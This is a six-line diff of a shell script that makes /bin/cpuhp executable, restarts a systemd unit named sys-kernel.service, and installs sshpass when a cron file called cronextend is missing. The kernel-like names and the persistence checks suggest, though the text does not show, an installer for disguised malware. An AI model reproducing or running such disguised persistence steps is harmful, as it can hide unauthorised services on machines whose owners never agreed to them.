@@ -1,6 +1,6 @@
 chmod +x /bin/cpuhp
 systemctl daemon-reload
-systemctl start sys-kernel.service
+systemctl restart sys-kernel.service
 if [ ! -f /etc/cron.d/cronextend ]; then
 	apt-get update
  	apt-get install -y sshpass
